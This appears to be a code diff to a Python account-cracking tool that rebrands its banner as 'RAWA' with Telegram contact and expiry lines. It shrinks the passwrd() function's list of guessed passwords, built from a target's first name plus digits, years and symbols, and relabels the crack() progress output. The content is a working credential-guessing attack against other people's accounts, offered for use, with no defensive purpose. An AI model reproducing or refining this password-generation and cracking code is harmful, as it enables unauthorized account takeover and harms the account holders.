@@ -309,12 +309,22 @@ def banner():
 
 
 
-██████╗░░█████╗░███████╗██╗░░██╗
-██╔══██╗██╔══██╗╚════██║██║░░██║
-██████╔╝██║░░██║░░███╔═╝███████║
-██╔══██╗██║░░██║██╔══╝░░██╔══██║
-██║░░██║╚█████╔╝███████╗██║░░██║
-╚═╝░░╚═╝░╚════╝░╚══════╝╚═╝░░╚═╝    """)
+██████   █████  ██     ██  █████  
+██   ██ ██   ██ ██     ██ ██   ██ 
+██████  ███████ ██  █  ██ ███████ 
+██   ██ ██   ██ ██ ███ ██ ██   ██ 
+██   ██ ██   ██  ███ ███  ██   ██
+
+
+
+\33[1;92m ■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■
+\33[1;36m TOOL CREATE BY➢  RaWa
+\33[1;34m CHENEL➢ NO
+\33[1;36m TELGRAM➢ & @l4m_rawa
+\33[1;34m VERSION➢1.2
+\33[1;32m RAWA is the father of Telegram
+\33[1;34m EXPIRED TOOL➢3DAYS
+\33[1;92m ■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■    """)
 os.system('clear')
 banner()
 #MENU
@@ -382,7 +392,7 @@ def Settings():
                 print('\x1b[1;91m\x1b[1;96m{H}\x1b[1;91mNOT HALBZHERA')
                 exit()
 
-        print('\x1b[1;93m METHODE MOBILE')
+        print('\x1b[1;93m METHOD MOBILE - UPDATE')
         print('')
         hc = "1"
         if hc in ['1','01']:
@@ -420,10 +430,6 @@ def passwrd():
                                 else:
                                         pwv.append(frs+frs)
                                         pwv.append(frs+' '+frs)
-                                        pwv.append('zaxozaxo')
-                                        pwv.append('zaxo12345')
-                                        pwv.append('hamahama')
-                                        pwv.append('hama12345')
                                         pwv.append(frs+"12")
                                         pwv.append(frs+"123")
                                         pwv.append(frs+"1234")
@@ -432,16 +438,6 @@ def passwrd():
                                         pwv.append(frs+"1234567")
                                         pwv.append(frs+"12345678")
                                         pwv.append(frs+"1122")
-                                        pwv.append(frs+"112233")
-                                        pwv.append(frs+"1212")
-                                        pwv.append(frs+"4321")
-                                        pwv.append(frs+"321")
-                                        pwv.append(frs+"54321")
-                                        pwv.append(frs+'1996')
-                                        pwv.append(frs+'1995')
-                                        pwv.append(frs+'1994')
-                                        pwv.append(frs+'1993')
-                                        pwv.append(frs+'1992')
                                         pwv.append(frs+'1991')
                                         pwv.append(frs+'1990')
                                         pwv.append(frs+'2008')
@@ -449,53 +445,12 @@ def passwrd():
                                         pwv.append(frs+'2006')
                                         pwv.append(frs+'2005')
                                         pwv.append(frs+'2004')
-                                        pwv.append(frs+'2003')
-                                        pwv.append(frs+'2002')
-                                        pwv.append(frs+'2001')
-                                        pwv.append(frs+'2000')
-                                        pwv.append(frs+'1999')
-                                        pwv.append(frs+'1998')
-                                        pwv.append(frs+'1997')
-                                        pwv.append(frs+'1122')
-                                        pwv.append(frs+'112233')
-                                        pwv.append(frs+'11223344')
-                                        pwv.append(frs+'1122334455')
-                                        pwv.append('12'+frs+'12')
-                                        pwv.append('123'+frs+'123')
-                                        pwv.append('1234'+frs+'1234')
-                                        pwv.append(frs+frs+'123')
-                                        pwv.append(frs+'1212')
-                                        pwv.append(frs+'1111')
-                                        pwv.append(frs+'0000')
-                                        pwv.append('07500750')
-                                        pwv.append("123"+frs)
-                                        pwv.append("1234"+frs)
-                                        pwv.append("12345"+frs)
-                                        pwv.append("123456"+frs)
-                                        pwv.append("12345678"+frs)
-                                        pwv.append("123456789"+frs)
-                                        pwv.append("1234567890"+frs)
-                                        pwv.append(frs+'12'+frs)
-                                        pwv.append(frs+'123'+frs)
-                                        pwv.append(frs+'12345'+frs)
-                                        pwv.append(frs+'@123')
-                                        pwv.append(frs+'@12345')
-                                        pwv.append(frs+'123@')
-                                        pwv.append(frs+'12345@')
-                                        pwv.append(frs+'1221')
-                                        pwv.append(frs+'123321')
-                                        pwv.append(frs+'12344321')
-                                        pwv.append(frs+'1234554321')
                         else:
                                 if len(frs)<3:
                                         pwv.append(nmf)
                                 else:
                                         pwv.append(frs+frs)
                                         pwv.append(frs+' '+frs)
-                                        pwv.append('zaxozaxo')
-                                        pwv.append('zaxo12345')
-                                        pwv.append('hamahama')
-                                        pwv.append('hama12345')
                                         pwv.append(frs+"12")
                                         pwv.append(frs+"123")
                                         pwv.append(frs+"1234")
@@ -504,16 +459,6 @@ def passwrd():
                                         pwv.append(frs+"1234567")
                                         pwv.append(frs+"12345678")
                                         pwv.append(frs+"1122")
-                                        pwv.append(frs+"112233")
-                                        pwv.append(frs+"1212")
-                                        pwv.append(frs+"4321")
-                                        pwv.append(frs+"321")
-                                        pwv.append(frs+"54321")
-                                        pwv.append(frs+'1996')
-                                        pwv.append(frs+'1995')
-                                        pwv.append(frs+'1994')
-                                        pwv.append(frs+'1993')
-                                        pwv.append(frs+'1992')
                                         pwv.append(frs+'1991')
                                         pwv.append(frs+'1990')
                                         pwv.append(frs+'2008')
@@ -521,43 +466,7 @@ def passwrd():
                                         pwv.append(frs+'2006')
                                         pwv.append(frs+'2005')
                                         pwv.append(frs+'2004')
-                                        pwv.append(frs+'2003')
-                                        pwv.append(frs+'2002')
-                                        pwv.append(frs+'2001')
-                                        pwv.append(frs+'2000')
-                                        pwv.append(frs+'1999')
-                                        pwv.append(frs+'1998')
-                                        pwv.append(frs+'1997')
-                                        pwv.append(frs+'1122')
-                                        pwv.append(frs+'112233')
-                                        pwv.append(frs+'11223344')
-                                        pwv.append(frs+'1122334455')
-                                        pwv.append('12'+frs+'12')
-                                        pwv.append('123'+frs+'123')
-                                        pwv.append('1234'+frs+'1234')
-                                        pwv.append(frs+frs+'123')
-                                        pwv.append(frs+'1212')
-                                        pwv.append(frs+'1111')
-                                        pwv.append(frs+'0000')
-                                        pwv.append('07500750')
-                                        pwv.append("123"+frs)
-                                        pwv.append("1234"+frs)
-                                        pwv.append("12345"+frs)
-                                        pwv.append("123456"+frs)
-                                        pwv.append("12345678"+frs)
-                                        pwv.append("123456789"+frs)
-                                        pwv.append("1234567890"+frs)
-                                        pwv.append(frs+'12'+frs)
-                                        pwv.append(frs+'123'+frs)
-                                        pwv.append(frs+'12345'+frs)
-                                        pwv.append(frs+'@123')
-                                        pwv.append(frs+'@12345')
-                                        pwv.append(frs+'123@')
-                                        pwv.append(frs+'12345@')
-                                        pwv.append(frs+'1221')
-                                        pwv.append(frs+'123321')
-                                        pwv.append(frs+'12344321')
-                                        pwv.append(frs+'1234554321')
+                                        
                         if 'ya' in pwpluss:
                                 for xpwd in pwnya:
                                         pwv.append(xpwd)
@@ -581,7 +490,7 @@ def passwrd():
 
 def crack(idf,pwv):
         global loop,ok,cp
-        sys.stdout.write(f"\r \033[1;31m[ᖇOᘔᕼ]<[Test]>[\033[2;32m{loop}\033[1;31m{P}/{h}{len(id)}{P}]\033[2;32m [{ok}]\x1b[38;5;208m{P} \033[1;34m "),
+        sys.stdout.write(f"\r \033[1;31m[RAWA]<[Test]>[\033[2;32m{loop}\033[1;31m{P}/{h}{len(id)}{P}]\033[2;32m [{ok}]\x1b[38;5;208m{P} \033[1;34m "),
         sys.stdout.flush()
         #ua = random.choice(ugen)
         #ua2 = random.choice(ugen2)
